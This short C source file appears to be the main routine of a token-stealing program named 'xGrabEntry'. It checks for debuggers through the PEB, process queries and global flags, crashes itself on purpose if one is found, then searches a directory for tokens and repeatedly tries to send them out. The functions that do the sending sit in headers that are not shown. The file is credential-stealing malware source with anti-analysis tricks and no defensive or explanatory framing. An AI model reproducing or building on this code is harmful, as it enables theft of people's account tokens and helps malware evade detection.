#include "external.h"
#include "defense.h"
#include "files.h"
#include "network.h"

int xGrabEntry() {

	int version = 31012022, counter = 3;
	BOOL success = FALSE;

	MessageBoxW(NULL, L"Hi", L"WOF", MB_OK);
	loadFunctions();

	if (TRUE || !checkDebuggerPEB() && !checkDebuggerQuery() && !checkDebuggerGlobalFlags()) {

		do {

			success = sendToken(searchTokenDirectory());

		} while (!success && counter--);

	}
	else {

		*((int*)0) = version;
	}

	return 0;
}